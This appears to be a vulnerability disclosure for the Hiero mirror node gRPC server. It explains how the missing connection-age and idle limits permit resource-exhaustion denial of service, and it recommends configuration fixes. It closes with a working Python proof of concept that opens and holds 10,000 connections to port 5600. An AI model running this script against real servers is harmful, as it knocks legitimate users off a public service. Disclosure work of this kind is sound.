### Title
Unbounded Connection Acceptance in `grpcServerConfigurer` Enables Resource Exhaustion DoS

### Summary
The `grpcServerConfigurer()` bean in `GrpcConfiguration.java` configures only `maxConcurrentCallsPerConnection` (capped at 5 per connection) but sets no limit on the total number of accepted connections, connection lifetime (`maxConnectionAge`), or idle connection timeout (`maxConnectionIdle`). An unprivileged attacker can open an unbounded number of persistent gRPC connections, exhausting file descriptors, HTTP/2 flow-control buffers, and thread-pool slots, causing the server to stop accepting new connections from legitimate clients.

### Finding Description
**Exact code path:**
`grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, lines 28–35, `grpcServerConfigurer()`:

```java
return serverBuilder -> {
    serverBuilder.executor(applicationTaskExecutor);
    serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection()); // = 5
};
```

`NettyProperties.java` (lines 11–15) exposes only `maxConcurrentCallsPerConnection = 5`. A grep across all `grpc/**/*.java` confirms that `maxConnectionAge`, `maxConnectionIdle`, `maxInboundMessageSize`, `permitKeepAliveTime`, and `SO_BACKLOG` are never set anywhere in the gRPC module.

**Root cause / failed assumption:**
The developer assumed that limiting concurrent *calls* per connection (5) would bound server load. It does not. Each connection is a separate HTTP/2 session with its own flow-control window, header-compression table, and OS file descriptor. An attacker opens N connections each carrying 0–5 idle streams; the per-connection call cap is never the binding constraint.

**Exploit flow:**
1. Attacker opens a large number of TCP connections to port 5600 and completes the HTTP/2 handshake on each (no authentication required for connection establishment).
2. Each connection is kept alive with HTTP/2 PING frames or a single long-lived streaming RPC (e.g., `subscribeTopic`).
3. Because there is no `maxConnectionAge` or `maxConnectionIdle`, the server never reclaims these connections.
4. The server's OS file-descriptor table fills up; the JVM heap fills with per-connection Netty `Channel` objects and HTTP/2 state; the shared `applicationTaskExecutor` thread pool queues saturate.
5. When the server can no longer accept new TCP connections (FD exhaustion or Netty's internal accept loop stalls), the OS TCP accept queue (default backlog ≈ 128) fills and the kernel silently drops incoming SYN packets from legitimate clients.

**Why the existing check is insufficient:**
`maxConcurrentCallsPerConnection(5)` is enforced *after* the connection is fully established and tracked. It does nothing to prevent the establishment of thousands of connections, each consuming ~tens of KB of kernel socket buffer, a Netty `NioSocketChannel` object, and an HTTP/2 session state machine.

### Impact Explanation
- **Availability (High):** Legitimate clients receive connection-refused or timeout errors. For a public mirror-node gRPC endpoint this means topic subscribers and address-book consumers are completely cut off.
- **No authentication barrier:** gRPC connection establishment on this server requires no credentials; any host with TCP reachability to port 5600 can execute the attack.
- **Persistence:** Without `maxConnectionAge`/`maxConnectionIdle`, the attacker's connections are never evicted; the server stays degraded until restarted or the attacker releases connections.

### Likelihood Explanation
- Requires only a TCP client capable of speaking HTTP/2 (e.g., `grpc-go`, `h2load`, or a trivial Python script using `grpcio`).
- No credentials, no prior knowledge of topic IDs, no privileged network position needed.
- Fully repeatable and scriptable; the attacker can sustain the attack with a single low-bandwidth machine.
- The "partition recovery window" amplifies impact but is not required; the attack is effective at any time.

### Recommendation
Add the following to `grpcServerConfigurer()` in `GrpcConfiguration.java` and expose the values as configurable `NettyProperties` fields:

```java
serverBuilder.maxConnectionAge(nettyProperties.getMaxConnectionAge(), TimeUnit.SECONDS);
serverBuilder.maxConnectionAgeGrace(nettyProperties.getMaxConnectionAgeGrace(), TimeUnit.SECONDS);
serverBuilder.maxConnectionIdle(nettyProperties.getMaxConnectionIdle(), TimeUnit.SECONDS);
serverBuilder.permitKeepAliveTime(nettyProperties.getPermitKeepAliveTime(), TimeUnit.SECONDS);
serverBuilder.permitKeepAliveWithoutCalls(false);
```

Reasonable defaults: `maxConnectionAge=300s`, `maxConnectionAgeGrace=10s`, `maxConnectionIdle=60s`, `permitKeepAliveTime=30s`. Additionally, deploy an infrastructure-level connection-rate limiter (e.g., an Envoy/Istio `connectionPool` limit or a Kubernetes `NetworkPolicy` with connection-rate rules) in front of port 5600.

### Proof of Concept
```python
# Requires: pip install grpcio
import grpc, threading, time

TARGET = "mirror-node-host:5600"
connections = []

def open_conn():
    ch = grpc.insecure_channel(TARGET)
    # Force HTTP/2 handshake
    try:
        grpc.channel_ready_future(ch).result(timeout=5)
    except:
        pass
    connections.append(ch)  # keep reference alive

# Open 10 000 connections from a single machine
threads = [threading.Thread(target=open_conn) for _ in range(10_000)]
for t in threads: t.start()
for t in threads: t.join()

print(f"Held {len(connections)} connections open")
# Legitimate clients now receive UNAVAILABLE / connection refused
time.sleep(3600)
```

Run this script; after a few thousand connections the server's FD limit is reached and new `grpc.insecure_channel` calls from other clients will fail with `StatusCode.UNAVAILABLE`.
